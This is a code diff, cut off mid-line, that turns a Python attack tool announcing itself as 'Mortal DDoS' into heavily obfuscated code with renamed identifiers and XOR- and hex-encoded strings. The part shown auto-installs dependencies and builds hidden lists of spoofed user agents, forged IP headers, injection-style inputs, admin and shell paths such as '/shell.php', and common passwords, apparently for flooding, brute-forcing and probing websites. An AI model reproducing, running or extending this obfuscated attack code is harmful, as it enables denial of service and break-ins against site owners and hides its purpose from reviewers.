@@ -1,1008 +1,736 @@
-# -*- coding: utf-8 -*-
-import threading, sys, time, os, socket, random, subprocess, ssl, struct, hashlib, json, re
+import sys, os, socket, subprocess, ssl, struct, json, re
 import requests
-import cloudscraper
 from colorama import Fore, Style, init
-import urllib3
-urllib3.disable_warnings()
-
+from cloudscraper import create_scraper as lIIIIlIlllIIIlIllllIIllI
+from hashlib import md5 as IlIIIIlIlllIIIlllllI, sha256 as IlIIlIllIllllIlllIlII
+from os import system as lllIllIIIlllllIlIIl, urandom as IIIllIIlIlIIlIIlllllI
+from random import choice as IIlIlIIllllllIllllIlI, randint as IlIIIlIlIlIIlIlI
+from requests import Session as IIlllIlIIIIIIlI, get as lIllIIlllIlIIIllIllIIlIII, head as IIlIIIlIIIIlIIIlllIIlII, post as lIlllIIIllIl
+from socket import gethostbyname as IllllIllIllIl, inet_aton as llIIlllllllIIlIlI, socket as lIllIlIIlIIlIIIlllIlIll
+from subprocess import run as IIlIlIIllIIIIlIllIIlIllI
+from threading import Lock as lIIlIlIIIlIlIIlllIIIllIIlII, Thread as lIllIIIIIIIIIIIlIIll
+from time import sleep as IlllIIlIIllll, time as llIIIllIlIIIIlIIllllIllI
+from urllib3 import disable_warnings as lIlllllIIllIlIlI
+IlIIIllIIllIllIlIIIIIlllll = globals()[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 211 for IlIlIIlIlIllllI in x[::-1]]).decode())([140, 140, 160, 189, 186, 167, 191, 186, 166, 177, 140, 140])]
+lIlIIIIllllIlIlIII = IlIIIllIIllIllIlIIIIIlllll if isinstance(IlIIIllIIllIllIlIIIIIlllll, dict) else IlIIIllIIllIllIlIIIIIlllll.__dict__
+lIlllllIIllIlIlI()
 init(autoreset=True)
 
-# --- AUTO INSTALL MISSING LIBRARIES ---
-def bootstrap():
-    print(f"{Fore.RED}[+] Initializing Mortal DDoS...")
-    required_libs = ["requests", "cloudscraper", "colorama"]
-    for lib in required_libs:
+def llIllIllIlllllIIIlllllllI():
+    lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 71174627270).to_bytes(5, 'big').decode())(416079147442)](f'{Fore.RED}[+] Initializing Mortal DDoS...')
+    IlIlIllIIIlIlllllIIlllllIll = [(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7374736575716572'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 28)) for IlIlIllIlIIlIlllI in x)))([127, 112, 115, 105, 120, 111, 127, 110, 125, 108, 121, 110]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 113) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('121e1d1e03101c10')]
+    for lIlIllIIlIIllIllIIllllIIl in IlIlIllIIIlIlllllIIlllllIll:
         try:
-            __import__(lib)
+            __import__(lIlIllIIlIIllIllIIllllIIl)
         except ImportError:
-            print(f"{Fore.YELLOW}[!] Missing {lib} - Installing...")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}[!] Missing {lIlIllIIlIIllIllIIllllIIl} - Installing...')
             try:
-                subprocess.run([sys.executable, "-m", "pip", "install", lib], 
-                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-                print(f"{Fore.GREEN}[+] Successfully installed {lib}")
+                IIlIlIIllIIIIlIllIIlIllI([sys.executable, (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6d2d'), (lambda n: int.__xor__(n, 10436819).to_bytes(3, 'big').decode())(15673763), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 71) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2e293433262b2b'), lIlIllIIlIIllIllIIllllIIl], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 165) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d5d7cccbd1')](f'{Fore.GREEN}[+] Successfully installed {lIlIllIIlIIllIllIIllllIIl}')
             except subprocess.CalledProcessError:
-                print(f"{Fore.RED}[-] Failed to install {lib}")
-                if lib == "cloudscraper":
-                    print(f"{Fore.YELLOW}[!] Try installing manually: pip install cloudscraper")
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 738137953130).to_bytes(5, 'big').decode())(943518792990)](f'{Fore.RED}[-] Failed to install {lIlIllIIlIIllIllIIllllIIl}')
+                if lIlIllIIlIIllIllIIllllIIl == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7265706172637364756f6c63'):
+                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 105)) for IlIlIllIlIIlIlllI in x)))([25, 27, 0, 7, 29])](f'{Fore.YELLOW}[!] Try installing manually: pip install cloudscraper')
+llIllIllIlllllIIIlllllllI()
+IlIllIllIlIIlIIIIlIIIIlll = 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 174 for IlIlIIlIlIllllI in x[::-1]]).decode())([152, 236]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 8871).to_bytes(2, 'big').decode())(16529), 16)
+IllIllllIIIIIlIlllllIIIIIII = lIIlIlIIIlIlIIlllIIIllIIlII()
+llllIIlIIlIIIIlllllIIIll = False
+IIIllIlllIllI = [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 98) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2f0d180b0e0e034d574c52424a350b0c060d1511422c364253524c525942350b0c545659421a54564b422312120e07350700290b164d5751554c5154424a292a362f2e4e420e0b090742250701090d4b42210a100d0f074d5350504c524c524c524231030403100b4d5751554c5154'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 123)) for IlIlIllIlIIlIlllI in x)))([54, 20, 1, 18, 23, 23, 26, 84, 78, 85, 75, 91, 83, 54, 26, 24, 18, 21, 15, 20, 8, 19, 64, 91, 50, 21, 15, 30, 23, 91, 54, 26, 24, 91, 52, 40, 91, 35, 91, 74, 79, 36, 73, 36, 74, 82, 91, 58, 11, 11, 23, 30, 44, 30, 25, 48, 18, 15, 84, 78, 72, 76, 85, 72, 77, 91, 83, 48, 51, 47, 54, 55, 87, 91, 23, 18, 16, 30, 91, 60, 30, 24, 16, 20, 82, 91, 56, 19, 9, 20, 22, 30, 84, 74, 73, 74, 85, 75, 85, 75, 85, 75, 91, 40, 26, 29, 26, 9, 18, 84, 78, 72, 76, 85, 72, 77]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 40) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('65475241444449071d0618080070191913086441465d500850101e771e1c0108695858444d7f4d4a63415c071d1b1f061b1e080063607c656404084441434d086f4d4b434701086b405a47454d07191a18061806180618087b494e495a41071d1b1f061b1e'), (lambda n: int.__xor__(n, 3291581137838895138799300733763642298390288564950804852493901486131596561963588020093129225118234558263430271841999360630064641749557975675255911124233579243750038378609478757528825150772710467).to_bytes(80, 'big').decode())(4381882489088073134658932138253961963574078978080604474379248305423173743497353156450883964250769273223195580786057535723127404866463457855428220668871023284212835547002369491557264435053568627), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 221 for IlIlIIlIlIllllI in x[::-1]]).decode())([236, 243, 233, 237, 235, 242, 180, 175, 188, 187, 188, 142, 253, 229, 233, 236, 152, 232, 236, 242, 184, 177, 180, 191, 178, 144, 253, 237, 243, 234, 236, 242, 179, 178, 180, 174, 175, 184, 139, 253, 244, 178, 182, 190, 184, 154, 253, 184, 182, 180, 177, 253, 241, 145, 144, 137, 149, 150, 245, 253, 232, 236, 243, 236, 243, 232, 237, 235, 242, 169, 180, 150, 191, 184, 138, 184, 177, 173, 173, 156, 253, 244, 133, 253, 142, 146, 253, 190, 188, 144, 253, 184, 182, 180, 177, 253, 237, 130, 234, 236, 253, 142, 146, 253, 184, 179, 178, 181, 141, 180, 253, 136, 141, 158, 253, 230, 184, 179, 178, 181, 141, 180, 245, 253, 237, 243, 232, 242, 188, 177, 177, 180, 167, 178, 144]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 120)) for IlIlIllIlIIlIlllI in x)))([53, 23, 2, 17, 20, 20, 25, 87, 77, 86, 72, 88, 80, 52, 17, 22, 13, 0, 67, 88, 57, 22, 28, 10, 23, 17, 28, 88, 73, 76, 81, 88, 57, 8, 8, 20, 29, 47, 29, 26, 51, 17, 12, 87, 77, 75, 79, 86, 75, 78, 88, 80, 51, 48, 44, 53, 52, 84, 88, 20, 17, 19, 29, 88, 63, 29, 27, 19, 23, 81, 88, 59, 16, 10, 23, 21, 29, 87, 73, 74, 74, 86, 72, 86, 72, 86, 72, 88, 53, 23, 26, 17, 20, 29, 88, 43, 25, 30, 25, 10, 17, 87, 77, 75, 79, 86, 75, 78]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 95)) for IlIlIllIlIIlIlllI in x)))([18, 48, 37, 54, 51, 51, 62, 112, 106, 113, 111, 127, 119, 8, 54, 49, 59, 48, 40, 44, 127, 17, 11, 127, 110, 111, 113, 111, 100, 127, 8, 54, 49, 105, 107, 100, 127, 39, 105, 107, 118, 127, 30, 47, 47, 51, 58, 8, 58, 61, 20, 54, 43, 112, 106, 108, 104, 113, 108, 105, 127, 119, 20, 23, 11, 18, 19, 115, 127, 51, 54, 52, 58, 127, 24, 58, 60, 52, 48, 118, 127, 26, 59, 56, 58, 112, 110, 109, 109, 113, 111, 113, 111, 113, 111, 127, 12, 62, 57, 62, 45, 54, 112, 106, 108, 104, 113, 108, 105]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 236 for IlIlIIlIlIllllI in x[::-1]]).decode())([220, 194, 222, 222, 221, 195, 148, 131, 138, 137, 158, 133, 170, 204, 221, 220, 221, 220, 220, 221, 220, 222, 195, 131, 135, 143, 137, 171, 204, 197, 220, 194, 222, 222, 221, 214, 154, 158, 204, 215, 216, 218, 179, 218, 212, 148, 204, 148, 153, 130, 133, 160, 204, 215, 153, 152, 130, 153, 142, 185, 204, 215, 221, 221, 180, 196, 204, 220, 194, 217, 195, 141, 128, 128, 133, 150, 131, 161])] * (0 .__class__((lambda n: int.__xor__(n, 5376).to_bytes(2, 'big').decode())(10039), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 58)) for IlIlIllIlIIlIlllI in x)))([9, 3]), 16))
+IlIllIllIllIllII = [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 38) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('0106697406171b170b0b'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 35 for IlIlIIlIlIllllI in x[::-1]]).decode())([14, 14, 111, 111, 118, 109, 3, 119, 96, 102, 111, 102, 112, 3, 109, 108, 106, 109, 118, 3, 4]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 56)) for IlIlIllIlIIlIlllI in x)))([89, 92, 85, 81, 86, 31, 24, 21, 21]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 251) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('dcdbbab5bfdbcac6c9d6d6'), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 56) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('1f1118776a18101f091f051f09'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 245 for IlIlIIlIlIllllI in x[::-1]]).decode())([216, 216, 213, 206, 134, 135, 144, 134, 128, 213, 176, 185, 183, 180, 161, 213, 165, 186, 167, 177, 213, 206, 210]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 73)) for IlIlIllIlIIlIlllI in x)))([110, 105, 6, 27, 105, 110, 120, 110, 116, 110, 120]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('23313d3120524f2027'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('2a2f313d3120524f2027'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 127 for IlIlIIlIlIllllI in x[::-1]]).decode())([82, 82, 88, 17, 22, 18, 27, 30]), (lambda n: int.__xor__(n, 1116253113035661547).to_bytes(8, 'big').decode())(7933608766728900545), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 105)) for IlIlIllIlIIlIlllI in x)))([8, 13, 4, 0, 7, 78, 74]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 41)) for IlIlIllIlIIlIlllI in x)))([14, 9, 102, 123, 9, 14, 81, 14, 20, 14, 81]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 183) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('9097f8e597868a869a9a979a'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 33)) for IlIlIllIlIIlIlllI in x)))([6, 1, 116, 111, 104, 110, 111, 1, 96, 109, 109, 1, 114, 100, 109, 100, 98, 117, 1, 16, 13, 19, 13, 18, 12, 12]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 134 for IlIlIIlIlIllllI in x[::-1]]).decode())([171, 171, 183, 187, 183, 166, 194, 200, 199, 166, 161, 232, 239, 235, 226, 231]), (lambda n: int.__xor__(n, 2086310074460623885173240453343787).to_bytes(14, 'big').decode())(1338371715550040389103953624958726), (lambda n: int.__xor__(n, 17002280445979759357129852510270905256542355).to_bytes(18, 'big').decode())(19866186308613402901245075615115270144241086), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 16)) for IlIlIllIlIIlIlllI in x)))([55, 48, 95, 66, 48, 55, 101, 126, 101, 99, 101, 113, 124, 55, 48, 45, 48, 55, 101, 126, 101, 99, 101, 113, 124, 55]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 143) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a8afc0ddafbeb2beafcec1cbafa8bea8b2a8be'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31273d27312720524f20276e696d6461'), (lambda n: int.__xor__(n, 118273593602709299365548347447432456).to_bytes(15, 'big').decode())(259109838311492820543116641346648101), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 137 for IlIlIIlIlIllllI in x[::-1]]).decode())([174, 230, 230, 239, 174, 169, 180, 169, 174, 230, 230, 239, 174, 169, 219, 198, 169, 174])]
+lIlIIIllllIIllll = [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 92) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('733d3831353273'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 252 for IlIlIIlIlIllllI in x[::-1]]).decode())([140, 148, 140, 210, 146, 149, 155, 147, 144, 211]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7068702e6e69676f6c2d70772f'), (lambda n: int.__xor__(n, 106381402013130528504352264238925014).to_bytes(15, 'big').decode())(306921542283866911060572439091050233), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 186) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('95d9d5d4dcd3dd94cad2ca'), (lambda n: int.__xor__(n, 41884367476923682026083541).to_bytes(11, 'big').decode())(16656920998015135403320761), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7068702e6c6c6568732f'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 45 for IlIlIIlIlIllllI in x[::-1]]).decode())([93, 69, 93, 3, 66, 75, 67, 68, 93, 69, 93, 2]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 150) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('b9e4f9f4f9e2e5b8e2eee2'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 84)) for IlIlIllIlIIlIlllI in x)))([123, 122, 51, 61, 32, 123, 55, 59, 58, 50, 61, 51]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 200 for IlIlIIlIlIllllI in x[::-1]]).decode())([190, 166, 173, 230, 231]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 77)) for IlIlIllIlIIlIlllI in x)))([98, 58, 61, 96, 46, 34, 35, 43, 36, 42, 99, 61, 37, 61]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 51)) for IlIlIllIlIIlIlllI in x)))([28, 80, 92, 93, 85, 90, 84, 70, 65, 82, 71, 90, 92, 93, 29, 67, 91, 67]), (lambda n: int.__xor__(n, 24918980370988150912859976).to_bytes(11, 'big').decode())(72439511092416684333225519), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 94)) for IlIlIllIlIIlIlllI in x)))([113, 45, 59, 42, 42, 55, 48, 57, 45, 112, 46, 54, 46]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 164 for IlIlIIlIlIllllI in x[::-1]]).decode())([212, 204, 212, 138, 198, 192, 139]), (lambda n: int.__xor__(n, 52010574511564764816504565259).to_bytes(13, 'big').decode())(3786993186148523074812493481595), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7068702e7463656e6e6f632f'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 32)) for IlIlIllIlIIlIlllI in x)))([15, 83, 69, 84, 85, 80, 14, 80, 72, 80]), (lambda n: int.__xor__(n, 24018489060356108905536272865).to_bytes(12, 'big').decode())(30623066613560192553746682257), (lambda n: int.__xor__(n, 1096203391953951187672691).to_bytes(10, 'big').decode())(941026886316548200756739), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7068702e747365742f'), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 74) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('653f3a26252b2e643a223a'), (lambda n: int.__xor__(n, 3246914655835994068676).to_bytes(9, 'big').decode())(2941575197473898915307), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('2f73656c69662f'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 104 for IlIlIIlIlIllllI in x[::-1]]).decode())([24, 0, 24, 70, 12, 9, 7, 4, 6, 31, 7, 12, 71])] * (0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 134) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e7'), 16) << 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 221 for IlIlIIlIlIllllI in x[::-1]]).decode())([236]), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 30) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2e'), 16))
+IIllIllIIllI = [(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 62)) for IlIlIllIlIIlIlllI in x)))([95, 90, 83, 87, 80]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 118) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('474445424340'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('64726f7773736170'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 65 for IlIlIIlIlIllllI in x[::-1]]).decode())([114, 115, 112, 47, 40, 44, 37, 32]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 8)) for IlIlIllIlIIlIlllI in x)))([121, 127, 109, 122, 124, 113]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 163 for IlIlIIlIlIllllI in x[::-1]]).decode())([215, 204, 204, 209]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('726f6f74'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('73736170'), (lambda n: int.__xor__(n, 349987707805).to_bytes(5, 'big').decode())(232087742697), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 87)) for IlIlIllIlIIlIlllI in x)))([51, 50, 49, 54, 34, 59, 35]), (lambda n: int.__xor__(n, 574120652218026532374822865225).to_bytes(13, 'big').decode())(8109580860891436140951462028859), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 106)) for IlIlIllIlIIlIlllI in x)))([6, 5, 13, 3, 4]), (lambda n: int.__xor__(n, 35339660917339775).to_bytes(7, 'big').decode())(3070212745894682), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 104)) for IlIlIllIlIIlIlllI in x)))([89, 90, 91, 92]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 93) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6c6f6e6968'), (lambda n: int.__xor__(n, 2725377726611514041015).to_bytes(9, 'big').decode())(2998462167281114978958), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 95 for IlIlIIlIlIllllI in x[::-1]]).decode())([103, 104, 105, 106, 107, 108, 109, 110]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 13)) for IlIlIllIlIIlIlllI in x)))([108, 111, 110, 60, 63, 62]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 203) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a6a4a5a0aeb2'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 68)) for IlIlIllIlIIlIlllI in x)))([32, 54, 37, 35, 43, 42]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 101)) for IlIlIllIlIIlIlllI in x)))([12, 9, 10, 19, 0, 28, 10, 16]), (lambda n: int.__xor__(n, 14519752322144301107).to_bytes(8, 'big').decode())(13399032016531686208), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('72657473616d'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('30393837363534333231'), (lambda n: int.__xor__(n, 4382025903518541795).to_bytes(8, 'big').decode())(6899365266992136849), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 87)) for IlIlIllIlIIlIlllI in x)))([102, 101, 100, 99, 98, 97, 96]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 109)) for IlIlIllIlIIlIlllI in x)))([4, 3, 25, 8, 31, 3, 8, 25]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6c65616863696d'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 197 for IlIlIIlIlIllllI in x[::-1]]).decode())([164, 166, 172, 182, 182, 160, 175])]
+lIIllIIlllIIllIIlIlI = [{(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 31 for IlIlIIlIlIllllI in x[::-1]]).decode())([109, 112, 89, 50, 123, 122, 123, 109, 126, 104, 109, 112, 89, 50, 71]): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 219) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('eae9ecf5ebf5ebf5ea')}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 70 for IlIlIIlIlIllllI in x[::-1]]).decode())([52, 41, 0, 107, 34, 35, 34, 52, 39, 49, 52, 41, 0, 107, 30]): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e302e302e3031')}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 126)) for IlIlIllIlIIlIlllI in x)))([38, 83, 56, 17, 12, 9, 31, 12, 26, 27, 26, 83, 56, 17, 12]): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 5)) for IlIlIllIlIIlIlllI in x)))([52, 50, 55, 43, 52, 51, 43, 53, 43, 52])}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 156 for IlIlIIlIlIllllI in x[::-1]]).decode())([238, 243, 218, 177, 248, 249, 248, 238, 253, 235, 238, 243, 218, 177, 196]): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('312e312e3836312e323931')}, {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 2) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('5a2f4d706b656b6c63766b6c652f4b52'): (lambda n: int.__xor__(n, 3205875260989650642023).to_bytes(9, 'big').decode())(2895581440131748727382)}, {(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('50492d65746f6d65522d58'): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 87)) for IlIlIllIlIIlIlllI in x)))([102, 101, 96, 121, 103, 121, 103, 121, 102])}, {(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('726464412d65746f6d65522d58'): (lambda n: int.__xor__(n, 3659893870047568597065).to_bytes(9, 'big').decode())(4562474109891523657336)}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 56)) for IlIlIllIlIIlIlllI in x)))([96, 21, 123, 84, 81, 93, 86, 76, 21, 113, 104]): (lambda n: int.__xor__(n, 1814943005299448930676).to_bytes(9, 'big').decode())(1536940059878200627013)}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 77)) for IlIlIllIlIIlIlllI in x)))([25, 63, 56, 40, 96, 14, 33, 36, 40, 35, 57, 96, 4, 29]): (lambda n: int.__xor__(n, 4068721407823822336555).to_bytes(9, 'big').decode())(4383618417535645260826)}, {(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 8)) for IlIlIllIlIIlIlllI in x)))([75, 78, 37, 75, 103, 102, 102, 109, 107, 124, 97, 102, 111, 37, 65, 88]): (lambda n: int.__xor__(n, 1492126674349176029270).to_bytes(9, 'big').decode())(1804420660514754571879)}, {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 179 for IlIlIIlIlIllllI in x[::-1]]).decode())([227, 250, 158, 223, 210, 214, 225, 158, 235]): (lambda n: int.__xor__(n, 3614565665241436495955).to_bytes(9, 'big').decode())(4477954951932488683106)}]
+IIlIIIllIIIlI = {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 110 for IlIlIIlIlIllllI in x[::-1]]).decode())([11, 28, 15, 2, 8, 10, 27, 1, 2, 45]): [{(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 142 for IlIlIIlIlIllllI in x[::-1]]).decode())([222, 199, 163, 233, 224, 231, 250, 237, 235, 224, 224, 225, 205, 163, 200, 205]): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 21 for IlIlIIlIlIllllI in x[::-1]]).decode())([36, 59, 37, 59, 37, 59, 34, 39, 36])}, {(lambda n: int.__xor__(n, 274353546303340470503058097436992).to_bytes(14, 'big').decode())(1824516102550102896956328283779088): (lambda n: int.__xor__(n, 693834483395939315112).to_bytes(9, 'big').decode())(381532695097259361177)}, {(lambda n: int.__xor__(n, 795307953989429051943752560968301471).to_bytes(15, 'big').decode())(1002254303916060612068414558227338477): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 229 for IlIlIIlIlIllllI in x[::-1]]).decode())([215, 203, 213, 203, 213, 203, 210, 215, 212, 197, 201, 212, 203, 213, 203, 213, 203, 210, 215, 212])}, {(lambda 